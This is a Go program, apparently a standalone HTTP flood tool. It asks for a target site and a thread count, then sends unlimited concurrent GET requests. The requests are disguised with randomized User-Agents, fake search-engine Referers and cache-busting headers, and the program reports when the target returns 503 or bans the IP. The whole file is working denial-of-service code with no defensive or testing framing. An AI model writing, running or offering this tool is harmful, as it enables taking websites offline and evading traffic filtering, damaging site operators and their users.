package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

var UAList = GetUAList()

func main() {

	var MaxThreads_, SiteURL string
	var MaxThreads int
	fmt.Printf("Enter URL of site: ")
	fmt.Scanln(&SiteURL)
	if !strings.HasPrefix(SiteURL, "http") {
		SiteURL = "http://" + SiteURL
	}
	fmt.Printf("Enter number of threads: ")
	fmt.Scanln(&MaxThreads_)
	MaxThreads, _ = strconv.Atoi(MaxThreads_)

	if runtime.GOOS == "windows" {
		exec.Command("cls").Run()
	} else {
		exec.Command("clear").Run()
	}

	fmt.Println("Initializing...")
	var ReqCount, OldCount, RetryCount, FailCount int
	var ReqStatus string
	limiter := make(chan int, MaxThreads)
	client := &http.Client{Timeout: time.Second * time.Duration(5)}

	fmt.Printf("Starting with %d threads...\n", MaxThreads)

	go func() {
		for {
			time.Sleep(time.Second * 5)
			if RetryCount == 5 {
				fmt.Println("\nRetry limit reached, Exiting...")
				os.Exit(0)
			}
			if ReqCount == OldCount {
				fmt.Println("\nNo new requests, Maybe site down ¯\\_(ツ)_/¯")
				RetryCount++
				continue
			}

			fmt.Printf("\rSent: %d | Failed: %d | Status: %s", ReqCount, FailCount, ReqStatus)
			OldCount = ReqCount
		}
	}()

	go func() {
		for {
			req, _ := http.NewRequest("GET", SiteURL, nil)
			PrepareHeaders(req)
			resp, err := client.Do(req)
			if err != nil {
				time.Sleep(time.Second * 3)
				continue
			}
			ReqStatus = resp.Status
			time.Sleep(time.Second * 5)
		}
	}()

	for {
		limiter <- 1
		go func() {
			req, _ := http.NewRequest("GET", SiteURL, nil)
			PrepareHeaders(req)
			resp, err := client.Do(req)
			if err != nil {
				FailCount++
				return
			}
			defer resp.Body.Close()
			if resp.StatusCode == 403 {
				fmt.Println("\n403 Forbidden: Maybe IP Banned!")
				os.Exit(1)
			} else if resp.StatusCode == 503 {
				fmt.Println("\n503 Service Unavailable")
				os.Exit(1)
			}
			ReqCount++
			<-limiter
		}()
	}
}

func PrepareHeaders(req *http.Request) {
	rand.Seed(time.Now().UnixNano())
	charsetList := []string{"utf-8", "*"}
	refererList := []string{"https://google.com/", "https://bing.com/", "https://search.yahoo.com/", "https://duckduckgo.com/", "https://startpage.com/"}
	contenttypeList := []string{"application/x-www-form-urlencoded", "text/html", "text/plain", "text/xml", "*/*"}
	uA := UAList[rand.Intn(len(UAList))]
	req.Header.Set("User-Agent", strings.TrimSuffix(uA, "\r"))
	req.Header.Set("Cache-Control", "no-cache, max-age=0")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(1000)))
	req.Header.Set("Accept-Charset", charsetList[rand.Intn(len(charsetList))])
	req.Header.Set("Referer", refererList[rand.Intn(len(refererList))])
	req.Header.Set("Content-Type", contenttypeList[rand.Intn(len(contenttypeList))])
}

func GetUAList() []string {
	ua, _ := ioutil.ReadFile("etc/ua.txt")
	return strings.Split(string(ua), "\n")
}
